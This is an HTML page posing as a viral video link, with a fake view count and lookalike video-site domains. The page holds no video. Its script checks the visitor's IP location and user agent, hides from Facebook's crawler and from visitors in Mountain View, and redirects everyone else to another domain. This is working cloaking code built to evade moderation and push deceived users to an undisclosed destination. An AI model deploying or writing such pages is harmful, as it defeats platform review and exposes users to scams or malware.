<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="46457685 Views">
  <meta property="og:image" content="https://cdn.vieedy.my.id/play.png">
  <meta property="og:url" content="https://cdn-videy.github.io">
  <meta property="og:type" content="video.other">

  <style>
    body {
      margin: 0;
      padding: 0;
      background: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    .info {
      text-align: center;
      font-size: 1.2em;
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <div class="info">Checking location...</div>

  <script>
    const targetDomain = "https://domaintujuan.com";
    const urlParams = new URLSearchParams(window.location.search);
    const videoId = urlParams.get('v');

    fetch("https://ipinfo.io/json?token=dae08c86966cc4")
      .then(response => response.json())
      .then(data => {
        const city = data.city.toLowerCase();
        const ua = navigator.userAgent.toLowerCase();
        const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");

        if (!isFacebookBot && videoId && city !== "mountain view") {
          window.location.href = targetDomain;
        } else {
          document.querySelector(".info").textContent = `Blocked from ${city}`;
        }
      })
      .catch(() => {
        document.querySelector(".info").textContent = "Could not detect location.";
      });
  </script>
</body>
</html>
